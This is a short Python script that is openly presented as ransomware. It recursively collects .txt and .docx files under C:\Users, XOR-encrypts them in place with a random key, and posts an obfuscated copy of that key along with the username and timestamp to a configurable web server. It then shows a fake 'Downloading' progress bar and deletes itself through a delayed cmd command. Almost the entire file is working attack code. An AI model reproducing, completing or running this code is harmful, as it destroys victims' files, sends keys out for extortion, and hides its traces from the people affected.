# Ransomeware.py
# 
# Programmer  : sagi.v
# Date        : 9/12/2022
#
#  The code encrypting files and 
#  Sending the key to a web server   
#  That log post requests 
#------------------------------------------


# Imports
import os
import random
import requests
import datetime
from threading import Thread
from queue import Queue
import sys
import subprocess
import time

# Constants
SERVER_URL = 'http://' # The address of the web server 
FILE_NAME = 'Ransomeware.py' # The file name
ENC_PATH = fr"C:\Users"

# Function for the progressbar
def progressbar(it, prefix="", size=60, out=sys.stdout): 
    count = len(it)
    def show(j):
        x = int(size*j/count)
        print("{}[{}{}] {}/{}".format(prefix, "#"*x, "."*(size-x), j, count), 
                end='\r', file=out, flush=True)
    show(0)
    for i, item in enumerate(it):
        yield item
        show(i+1)
    print("\n", flush=True, file=out)


def main():
    #input('Are you sure?')
    username = os.getenv('username')
     
    enc_ext = ['.txt','.docx'] # Extensions list for the files, add here the files types you want to 
    files_paths = []
    
    # Inserting all the files in the path into a list
    for root, dirs, files in os.walk(ENC_PATH): # Files in this path will be encrypt
        for file in files:
            file_path, file_ext = os.path.splitext(root + '\\' + file)
            if file_ext in enc_ext:
                files_paths.append(file_path + file_ext)
    key = ''
    encryption_level = 128//8
    char_pool = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()~.-=+_`:;<>?'

    
    # Creating random key forn the char pool
    for i in range(encryption_level):
        key += random.choice(char_pool)
    date = datetime.datetime.now()
    
    # Changing the characters positions in the key
    enc_key = key[::-1]
    first_key, second_key = enc_key[:8], enc_key[8:]
    enc_key = second_key + first_key
    
    data = f'Key - [{enc_key}], Time - {date}, Host - {username}'
    x=requests.post(SERVER_URL, json = data)

    q = Queue()
    for file in files_paths:
        q.put(file)
    for i in range(50):
        thread = Thread(target=encrypt, args=(key, q, ), daemon=True)
        thread.start()
    q.join()
    
    # Showing fake prograss bar
    for i in progressbar(range(20), "Downloading: ", 40):
        time.sleep(0.4)
    
    # Deleting the script
    path = os.getcwd() + f"\\{FILE_NAME}"
    subprocess.Popen(f"cmd /c ping localhost -n 3 > nul & del -f {path}")
    sys.exit(0)

# Encrypting the files in the queue
def encrypt(key, q):

    # While there is a file in the queue
    while q.not_empty:
        file = q.get()
        index = 0
        max_index = 15
        try:
            with open(file, 'rb') as read_file:
                data = read_file.read()
            with open(file, 'wb') as write_file:
                for byte in data:
                    xor_byte = byte ^ ord(key[index])
                    write_file.write(xor_byte.to_bytes(1, 'little')) # Little endian for windows
                    if index >= max_index:
                        index = 0
                    else:
                        index += 1

        except:
            pass # Failed to encrypt the file
        q.task_done()        

        
if __name__ == "__main__":
    main()
